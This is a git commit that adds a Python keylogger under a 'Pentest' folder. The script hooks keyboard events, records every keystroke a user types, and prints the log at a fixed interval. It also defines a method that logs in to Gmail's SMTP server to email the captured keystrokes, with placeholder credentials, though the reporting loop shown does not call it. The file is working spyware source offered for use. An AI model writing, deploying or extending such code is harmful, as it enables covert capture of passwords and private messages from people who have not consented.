47bc61132c65d0e5fbfcd1c1e42a853f072b7849
LarsRosenkilde <50791042+LarsRosenkilde@users.noreply.github.com>
2021-05-25 10:10:12 +0200

    Add files via upload

---
+++ Pentest/keylogger.py
@@ -0,0 +1,64 @@
+import keyboard
+import smtplib
+from threading import Semaphore, Timer
+
+
+SEND_REPORT_EVERY = 20
+EMAIL_ADDRESS = "put_real_address_here@gmail.com"
+EMAIL_PASSWORD = "put_real_pw"
+
+
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ""
+        # for blocking after setting the on_release listener
+        self.semaphore = Semaphore(0)
+
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+
+        self.log += name
+
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            print(self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
+
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+
+        self.semaphore.acquire()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
